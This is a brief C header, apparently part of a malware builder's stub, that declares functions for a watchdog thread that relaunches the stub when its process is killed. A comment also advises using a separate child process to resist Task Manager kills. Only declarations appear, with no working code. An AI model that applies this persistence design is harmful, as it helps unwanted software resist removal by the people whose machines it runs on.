/* blackveil/builder/stub/watchdog.h */
#ifndef BLACKVEIL_WATCHDOG_H
#define BLACKVEIL_WATCHDOG_H

#include <windows.h>

/* Spawn a watchdog thread that re-launches the stub if the main
 * process is killed while the mutex is still expected to exist.
 * The watchdog is a plain thread inside the same process — killing
 * the process kills the watchdog too. Real protection against task
 * manager kill requires a separate process, built as a child. */
BOOL bv_watchdog_start(const WCHAR *self_path, const WCHAR *mutex_name,
                       DWORD restart_ms);

/* Best-effort: disable the watchdog by signalling the thread to exit. */
void bv_watchdog_stop(void);

#endif
